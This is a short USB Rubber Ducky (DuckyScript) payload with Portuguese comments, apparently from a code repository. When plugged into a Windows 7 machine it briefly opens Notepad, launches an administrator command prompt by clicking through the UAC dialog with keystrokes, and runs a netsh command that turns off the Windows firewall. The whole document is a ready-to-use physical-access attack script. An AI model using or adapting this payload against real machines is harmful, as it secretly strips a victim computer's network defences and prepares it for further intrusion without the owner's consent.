# W7-Firewall-disable-USB-rubber-Ducky
#Disable the firewall of W7 using an USB Rubber Ducky

REM Turn on or off firewall for the current profile

REM Aviso de inicializacao

DELAY 1000
GUI r
DELAY 500
STRING notepad
DELAY 500
ENTER
DELAY 500
STRING Aviso de inicializacao
DELAY 500
ALT F4
DELAY 500
RIGHT
DELAY 500
ENTER


REM Iniciando o CMD como Administrador

DELAY 500
CONTROL ESC
DELAY 500
STRING cmd
DELAY 500
MENU
DELAY 500
DOWN
DELAY 500
DOWN
DELAY 500
ENTER 
DELAY 500
LEFT
DELAY 500
ENTER

REM Desabilitando o firewall

DELAY 500
STRING netsh advfirewall set  currentprofile state off
ENTER
DELAY 500
STRING exit
ENTER
